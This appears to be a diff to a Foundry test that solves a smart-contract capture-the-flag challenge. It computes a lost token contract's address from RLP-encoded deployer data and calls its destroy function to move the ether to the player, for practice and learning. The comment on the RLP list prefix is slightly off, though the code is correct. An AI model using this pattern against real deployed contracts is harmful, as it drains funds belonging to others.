@@ -19,7 +19,16 @@ contract TestRecovery is Test {
     function testSolution() public {
         vm.startPrank(player);
 
-        // Your exploit goes here
+        // address 20 bytes -> RLP string 0-55 bytes: [(0x80 + length), string] = 0x80 + 0x14 = [0x94, string]
+        // nonce 1byte -> RLP single byte (0-127) = 0x01
+        //                                                                      (1b    20b     1b) = 22b
+        // RLP lists length < 55 bytes: [0xc + length + RLP(items) = [0xc + 22, 0x94, address, nonce]
+        //                                                             0xd6, 0x94, address, 0x1
+        address payable lost_address = payable(address(
+            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(instance), bytes1(0x01)))))
+        ));
+
+        SimpleToken(lost_address).destroy(payable(player));
 
         vm.stopPrank();
 
